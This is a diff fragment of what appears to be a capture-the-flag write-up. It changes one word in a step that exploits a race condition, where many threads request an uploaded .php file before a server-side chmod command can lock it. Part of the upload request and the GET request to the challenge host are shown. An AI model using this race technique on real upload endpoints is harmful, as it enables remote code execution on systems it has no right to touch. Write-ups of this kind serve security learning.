@@ -307,7 +307,7 @@ Content-Disposition: form-data; name=&#34;submit&#34;
 Submit Art
 ------WebKitFormBoundaryBHpbYJMycIteIKgs--
 </code></pre><ol start="2">
-<li>Exploiting the race condition. I am requesting the downloadable file in 100 threads, some requests managed to obtain the resource before shell_exec(&lsquo;chmod &ndash; 000 *&rsquo;); was executed.</li>
+<li>Exploiting the race condition. I am requesting the uploadable file in 100 threads, some requests managed to obtain the resource before shell_exec(&lsquo;chmod &ndash; 000 *&rsquo;); was executed.</li>
 </ol>
 <pre tabindex="0"><code>GET /uploads/a21bbb59a6d7db8e04005130cabd044d/.php HTTP/2
 Host: art-contest-974780027560.us-east5.run.app
